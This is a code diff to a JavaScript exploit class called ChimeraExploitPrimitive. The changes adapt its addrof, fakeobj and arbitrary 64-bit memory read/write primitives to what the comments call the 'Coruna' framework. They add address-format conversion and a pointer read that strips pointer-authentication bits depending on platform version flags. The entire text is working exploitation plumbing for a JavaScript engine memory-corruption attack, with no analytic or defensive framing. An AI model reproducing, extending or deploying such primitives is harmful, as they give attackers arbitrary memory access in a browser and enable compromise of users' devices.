@@ -5676,49 +5676,60 @@ class ChimeraExploitPrimitive {
    * @param {Function} read64Fn  - (BigInt addr) => BigInt value
    * @param {Function} write64Fn - (BigInt addr, BigInt val) => void
    * @param {Function} cleanupFn - () => void
+   *
+   * NOTE: Coruna framework uses plain Number for addresses throughout.
+   * utilityModule.T(lo, hi) = lo + 0x100000000 * hi → Number.
+   * All public methods accept/return Number addresses. BigInt is used
+   * only internally for the underlying read64/write64 primitives.
    */
   constructor(addrofFn, fakeobjFn, read64Fn, write64Fn, cleanupFn) {
-    this._addrof = addrofFn;
-    this._fakeobj = fakeobjFn;
-    this._read64 = read64Fn;
-    this._write64 = write64Fn;
+    this._addrof = addrofFn;   // returns BigInt
+    this._fakeobj = fakeobjFn; // takes BigInt
+    this._read64 = read64Fn;   // BigInt → BigInt
+    this._write64 = write64Fn; // (BigInt, BigInt) → void
     this._cleanup = cleanupFn;
-    this.yr = false; // raw-pointer mode flag (for Int64 address support)
+    this.yr = false;
   }
 
-  // --- Low-level reads (Coruna interface) ---
+  // Convert Number address → BigInt for internal use
+  _toBig(addr) {
+    if (typeof addr === "bigint") return addr;
+    // Number addresses from Coruna are lo + hi*2^32 (always positive)
+    if (addr < 0) addr += 0x100000000;
+    return BigInt(Math.floor(addr)) & 0xFFFFFFFFFFFFFFFFn;
+  }
+
+  // --- Low-level reads (Coruna interface — all addrs are Number) ---
 
   read32(addr) {
-    // addr may be a Number (raw uint32 offset) or need BigInt conversion
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    const val = this._read64(a);
+    const val = this._read64(this._toBig(addr));
     return Number(val & 0xFFFFFFFFn);
   }
 
   write32(addr, val) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    // Read current 64-bit, replace lower 32 bits
+    const a = this._toBig(addr);
     const cur = this._read64(a);
     const updated = (cur & 0xFFFFFFFF00000000n) | BigInt(val >>> 0);
     this._write64(a, updated);
   }
 
   write64(addr, lo, hi) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
+    const a = this._toBig(addr);
     if (hi !== undefined) {
       this._write64(a, (BigInt(hi >>> 0) << 32n) | BigInt(lo >>> 0));
+    } else if (typeof lo === "bigint") {
+      this._write64(a, lo);
     } else {
-      // lo is a BigInt full value
-      this._write64(a, typeof lo === "bigint" ? lo : BigInt(lo));
+      this._write64(a, this._toBig(lo));
     }
   }
 
   readByte(addr) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
+    const a = this._toBig(addr);
     const aligned = a & ~7n;
-    const offset = Number(a & 7n);
+    const byteOff = Number(a & 7n);
     const val = this._read64(aligned);
-    return Number((val >> BigInt(offset * 8)) & 0xFFn);
+    return Number((val >> BigInt(byteOff * 8)) & 0xFFn);
   }
 
   read32FromInt64(A) {
@@ -5735,14 +5746,28 @@ class ChimeraExploitPrimitive {
   }
 
   readInt64FromOffset(A) {
+    // A is a Number (from addrof + offset arithmetic)
     const t = this.read32(A),
       Q = this.read32(A + 4);
     return new utilityModule.Int64(t, Q);
   }
 
   readRawBigInt(addr) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    return this._read64(a);
+    // Returns the Coruna-style Number: lo + hi * 2^32
+    const a = this._toBig(addr);
+    const val = this._read64(a);
+    const lo = Number(val & 0xFFFFFFFFn);
+    const hi = Number((val >> 32n) & 0xFFFFFFFFn);
+    return utilityModule.T(lo, hi);
+  }
+
+  readDoubleAsPointer(addr, stripPAC) {
+    const lo = this.read32(addr);
+    let hi = this.read32(addr + 4);
+    if (stripPAC || platformModule.platformState.versionFlags.zohDDd) {
+      hi &= 0x7FFFFFFF;
+    }
+    return utilityModule.T(lo, hi);
   }
 
   readString(A, maxLen = 256) {
@@ -5755,12 +5780,18 @@ class ChimeraExploitPrimitive {
     return s;
   }
 
+  // addrof: returns Number (Coruna convention: lo + hi * 2^32)
   addrof(obj) {
-    return this._addrof(obj);
+    const bigAddr = this._addrof(obj);
+    const lo = Number(bigAddr & 0xFFFFFFFFn);
+    const hi = Number((bigAddr >> 32n) & 0xFFFFFFFFn);
+    return utilityModule.T(lo, hi);
   }
 
   fakeobj(val) {
-    return this._fakeobj(val);
+    // val may be a Number address or an Int64-like; convert to BigInt for internal use
+    if (typeof val === "bigint") return this._fakeobj(val);
+    return this._fakeobj(this._toBig(val));
   }
 
   copyMemory32(dst, src, len) {
